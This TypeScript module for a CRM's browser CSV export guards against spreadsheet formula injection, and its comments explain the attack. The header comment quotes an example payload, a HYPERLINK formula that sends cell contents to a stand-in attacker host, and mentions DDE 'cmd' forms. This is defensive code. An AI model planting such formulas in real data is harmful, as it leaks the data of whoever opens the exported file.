/**
 * Building CSV files in the browser, safely — the one place that decides how a cell is written.
 *
 * WHY THIS FILE EXISTS RATHER THAN AN `esc` HELPER IN EACH PAGE. There were two, one in the Leads
 * page and one in the Campaigns page, written the same way and both incomplete in the same way:
 *
 *     const esc = (v) => `"${String(v ?? '').replace(/"/g, '""')}"`;
 *
 * That is correct CSV *quoting* — it stops a value containing a comma or a quote from breaking the
 * structure of the file. It is not protection against a spreadsheet, and the two are different
 * problems that look like one.
 *
 * THE ATTACK. A spreadsheet strips the surrounding quotes when it parses the file, and then treats
 * any cell whose text begins with `=`, `+`, `-`, `@`, a tab or a carriage return as a FORMULA. So a
 * lead named
 *
 *     =HYPERLINK("http://attacker.example/?d="&A1,"Click for your report")
 *
 * is stored as harmless text, exported as `"=HYPERLINK(...)"`, and then evaluated the moment an
 * agent opens their own lead list in Excel. `=HYPERLINK` sends the contents of neighbouring cells to
 * an address the attacker chose; the DDE forms attempt worse.
 *
 * WHAT MAKES IT REACHABLE. Lead names do not come from inside the brokerage. They arrive from Meta
 * lead-ad forms and from CSV imports — text typed by strangers, stored verbatim, and handed back to
 * staff in a file format that executes code. The victim is the person who exported their own data.
 *
 * THE FIX is one character: a leading apostrophe, which every major spreadsheet (Excel, LibreOffice,
 * Google Sheets) reads as "the rest of this cell is literal text" and does not display as content.
 * The same rule already guards the audit-trail export on the server
 * (`server/src/audit-log/audit-export.service.ts`); the character class below is deliberately
 * identical to that one, so the application has ONE definition of "this cell is dangerous" rather
 * than two that can drift apart — which is precisely how this gap opened.
 */

/**
 * The characters that make a spreadsheet treat a cell as a formula rather than as text.
 *
 * Tab and carriage return are in the list because they are stripped as leading whitespace by some
 * parsers, exposing whatever follows — so `\t=cmd|...` is the same attack wearing a hat.
 */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

/**
 * One CSV cell: neutralised against formula evaluation, then quoted.
 *
 * Order matters. The apostrophe goes on before quoting, so it ends up INSIDE the quotes and travels
 * with the value; adding it afterwards would put it outside and break the file.
 *
 * Every value is quoted, not only the ones that need it. That is what the two original helpers did,
 * it is valid CSV, and keeping it means this change alters nothing about existing exports except the
 * cells that were dangerous.
 */
export function csvCell(value: unknown): string {
  let s = String(value ?? '');
  if (FORMULA_LEAD.test(s)) s = `'${s}`;
  return `"${s.replace(/"/g, '""')}"`;
}

/** One row of already-ordered values. */
export const csvRow = (values: unknown[]): string => values.map(csvCell).join(',');

/**
 * A table built from row objects, using the first row's keys as the header.
 *
 * Returns an empty string for an empty list rather than a lone header, so a caller can treat "" as
 * "there was nothing to write" without inspecting the array twice.
 */
export function objectsToCsv(rows: Record<string, unknown>[]): string {
  if (!rows.length) return '';
  const headers = Object.keys(rows[0]);
  return [csvRow(headers), ...rows.map((r) => csvRow(headers.map((h) => r[h])))].join('\r\n');
}

/**
 * Hand a finished CSV to the browser as a download.
 *
 * The leading U+FEFF is a byte-order mark. Without it Excel reads the file in the machine's local
 * ANSI codepage, and every accented name in a Toronto brokerage's lead list arrives mangled.
 *
 * CRLF, not LF, because RFC 4180 says so and because Excel on Windows is the overwhelming consumer
 * of these files.
 */
export function downloadCsv(csv: string, filename: string): void {
  const blob = new Blob(['﻿' + csv], { type: 'text/csv;charset=utf-8;' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  a.remove();
  URL.revokeObjectURL(url);
}
